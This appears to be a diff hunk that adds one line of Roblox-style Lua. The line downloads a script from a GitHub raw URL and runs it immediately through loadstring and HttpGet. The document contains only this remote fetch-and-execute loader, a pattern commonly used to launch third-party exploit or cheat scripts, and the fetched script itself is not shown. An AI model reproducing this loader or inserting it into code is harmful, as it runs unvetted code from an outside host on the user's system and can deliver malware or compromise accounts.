@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MS7top/F2/refs/heads/main/F2.txt"))()
